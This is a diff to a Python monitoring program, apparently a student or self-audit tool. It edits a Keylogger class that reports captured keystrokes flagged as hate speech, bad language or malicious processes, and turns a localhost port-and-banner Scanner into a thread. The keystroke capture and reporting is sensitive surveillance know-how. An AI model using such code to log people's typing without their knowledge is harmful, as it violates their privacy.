@@ -152,7 +152,7 @@ class Keylogger:
     def report(self):
         if self.log and (isHateSpeech(self) or isBadLanguage(self) or areMaliciousProcess(self)):
             logging("Foi enviado o report!")
-            sendAlert(self)
+            sendAlert(self.log)
 
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -165,8 +165,9 @@ class Keylogger:
         keyboard.wait()
 
 
-class Scanner:
+class Scanner(threading.Thread):
     def __init__(self):
+        threading.Thread.__init__(self)
         self.ports = []
         self.banners = []
         self.log = ''
@@ -194,21 +195,19 @@ class Scanner:
         except:
             pass
 
-    def scan(self):
+    def run(self):
         for port in range(1, 5051):
             while threading.active_count() > 150:
                 time.sleep(0.01)
-            logging("Inicio do programa!"+str(port)+"\n")
             thread = threading.Thread(target=self.port_scanner, args=["localhost", port])
             thread.start()
-        logging("Inicio do programa! teste fora do for\n")
         with open(r"C:\keyLogger\vulnarable_banners.txt", "r") as file:
             data = file.read()
             for i in range(len(self.banners)):
                 if self.banners[i] in data:
                     self.log = f"[!]Vulneribility found: {self.banners[i]} at port {self.ports[i]}"
-                    logging(self.log + "\n")
-                    sendAlert(self)
+                    logging(self.log)
+                    sendAlert(self.log)
 
 
 if __name__ == "__main__":
